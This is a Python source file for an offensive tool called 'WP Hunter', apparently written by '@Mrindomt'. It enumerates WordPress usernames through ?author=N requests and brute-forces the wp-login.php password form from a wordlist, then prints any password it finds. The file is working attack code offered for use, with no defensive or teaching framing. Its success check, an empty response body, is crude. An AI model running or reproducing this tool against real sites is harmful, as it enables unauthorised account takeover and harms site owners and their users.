import sys
import requests
import re
import argparse
from datetime import datetime
from termcolor import colored

USERAGENT = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/21.0"
TIMEOUT = 1
COOKIE = f"cookie-{int(datetime.now().timestamp())}"
COOKIEPATH = f"/tmp/{COOKIE}"

def print_banner():
    print(colored("\033[1;31m"
                  " __          _______    _    _             _            \n"
                  " \ \        / /  __ \\  | |  | |           | |           \n"
                  "  \ \  /\\  / /| |__) | | |__| |_   _ _ __ | |_ ___ _ __ \n"
                  "   \\ \\/  \\/ / |  ___/  |  __  | | | | '_ \\| __/ _ \\ '__|\n"
                  "    \\  /\\  /  | |      | |  | | |_| | | | | ||  __/ |   \n"
                  "     \\/  \\/   |_|      |_|  |_|\\__,_|_| |_|\\__\\___|_|   \n"
                  "                                                        \n"
                  "                            \033[1;34m  @Mrindomt \n", "blue"))

def help_menu():
    print(colored("\033[1;33mArguments:\n\t-u\t\twordpress url\n\t-us\t\twordpress username\n\t--wordlist\tpath to password wordlist\n", "yellow"))
    print(colored("\033[1;32mUser Enumeration:\n./brute.py -u=www.example.com\n\nPassword Bruteforce:\n./brute.py -u=www.example.com --us=admin --wordlist=wordlist.txt\033[0m", "green"))

def test_url(wp_url):
    try:
        check_url = requests.head(f"{wp_url}/wp-login.php", timeout=TIMEOUT).status_code
        if check_url != 200:
            print(colored(f"Url error: {wp_url}\nHTTP CODE: {check_url}", "red"))
            sys.exit()
    except requests.RequestException as e:
        print(colored(f"Error testing URL: {e}", "red"))
        sys.exit()

def user_enum(wp_url):
    print("[+] Username or nickname enumeration")
    for i in range(1, 11):
        try:
            response = requests.get(f"{wp_url}/?author={i}", headers={"User-Agent": USERAGENT})
            response.raise_for_status()
            users = re.findall(r'\/author\/.*\/?mode', response.text)
            if users:
                print(colored(users[0], "green"))
                print(colored(f"{wp_url}/?author={i}", "green"))
        except requests.RequestException as e:
            print(colored(f"Error enumerating users: {e}", "red"))
    sys.exit()

def main():
    parser = argparse.ArgumentParser(description="WordPress Bruteforce Tool")
    parser.add_argument("-u", required=True, help="WordPress URL")
    parser.add_argument("-us", help="WordPress username")
    parser.add_argument("--wordlist", help="Path to password wordlist")

    args = parser.parse_args()

    if args.us and args.wordlist:
        wp_admin = args.us
        wp_password = args.wordlist
        wp_url = args.u

        try:
            test_url(wp_url)
        except SystemExit:
            sys.exit()

        response = requests.get(f"{wp_url}/wp-login.php", headers={"User-Agent": USERAGENT})
        open(COOKIEPATH, 'w').close()

        print("[+] Bruteforcing user [{}]".format(wp_admin))
        with open(wp_password, 'r') as file:
            for line in file:
                line = line.strip()
                print(line)
                payload = {
                    'log': wp_admin,
                    'pwd': line,
                    'wp-submit': 'Log In',
                    'redirect_to': f'{wp_url}/wp-admin',
                    'testcookie': 1
                }

                try:
                    req = requests.post(f"{wp_url}/wp-login.php", headers={"User-Agent": USERAGENT},
                                        cookies={'testcookie': '1'}, data=payload, timeout=TIMEOUT)
                    req.raise_for_status()

                    if not req.text:
                        print(colored(f"The password is: {line}", "green"))
                        sys.exit()
                    else:
                        print(colored(f"Incorrect password: {line}", "red"))

                except requests.RequestException as e:
                    print(colored(f"Error during bruteforce: {e}", "red"))
                    sys.exit()

    elif args.u:
        try:
            test_url(args.u)
            user_enum(args.u)
        except SystemExit:
            sys.exit()

    else:
        help_menu()
        sys.exit()

if __name__ == "__main__":
    main()
